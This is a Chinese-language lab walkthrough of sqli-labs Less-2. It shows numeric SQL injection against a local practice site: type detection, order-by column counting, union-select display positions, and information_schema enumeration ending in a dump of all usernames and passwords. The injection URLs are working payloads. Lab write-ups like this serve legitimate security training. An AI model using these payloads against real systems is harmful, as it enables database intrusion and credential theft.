# Less-2

**前言**

​	**Less-2相较于Less-1，并无太大变化，唯一的区别在于由Less-1的字符型注入变成了数字型注入，但整体的处理方法不变**

与Less-1一样，将带值的ID作为参数输入

![1622094006798](1622094006798.png)

尝试提交id=1，能够看到页面发生变化，出现Dumb用户的密码，更改id的数值会有不同的用户名及密码出现，并且添加单引号后，页面抛出异常，说明sql语句里存在引号非法闭合，判断这里存在注入，这都与Less-1相同

## 2.1 判断sql注入的类型

判断是否为数字型注入？可以看到页面发生变化，在and条件下1=2不成立没有返回结果，所以Less-2是数字型sql注入

```http
http://localhost:8080/sqli-labs-master/Less-2/?id=1 and 1=1
```

![1622094402067](1622094402067.png)

```http
http://localhost:8080/sqli-labs-master/Less-2/?id=1 and 1=2
```

![1622094415545](1622094415545.png)

## 2.2 判断字段数量

判断方法同样是使用order by，结果与Less-1相同，字段数量为3

```http
http://localhost:8080/sqli-labs-master/Less-2/?id=1 order by 1 --+
http://localhost:8080/sqli-labs-master/Less-2/?id=1 order by 2 --+
http://localhost:8080/sqli-labs-master/Less-2/?id=1 order by 3 --+
http://localhost:8080/sqli-labs-master/Less-2/?id=1 order by 4 --+
```

![1622094686959](1622094686959.png)

## 2.3 确定显示位置

使用联合查询union select来确定结果集的显示位置，这里可以获得字段2和字段3的信息，注意id=-1是为了查询一个不存在的用户账户，来保证返回信息是自己构造的联合查询结果

```http
http://localhost:8080/sqli-labs-master/Less-2/?id=-1 union select 1,2,3 --+
```

![1622094772527](1622094772527.png)

## 2.4 获取数据库信息

借助联合查询，利用函数来替换数字在显示位置获得返回的数据库信息

```http
http://localhost:8080/sqli-labs-master/Less-2/?id=-1 union select 1,database(),version() --+
```

![1622094895584](1622094895584.png)

## 2.5 获取表名和列名

MySQL数据库5.0以上版本默认存在information_schema数据库，该数据库包含数据库内的所有数据库名，表名和列名，所以我们可以借助该库，依次获得表名和列名

```http
http://localhost:8080/sqli-labs-master/Less-2/?id=-1 union select 1,database(),group_concat(table_name) from information_schema.tables where table_schema='security' --+
```

![1622095190472](1622095190472.png)

```http
http://localhost:8080/sqli-labs-master/Less-2/?id=-1 union select 1,database(),group_concat(column_name)  from information_schema.columns where table_schema='security' and table_name = 'users' --+
```

![1622095320921](1622095320921.png)

## 2.6 获取用户名和密码

最后dump出security数据库的所有账户和密码

```http
http://localhost:8080/sqli-labs-master/Less-2/?id=-1 union select 1,group_concat(username),group_concat(password) from security.users --+
```

![1622095493719](1622095493719.png)
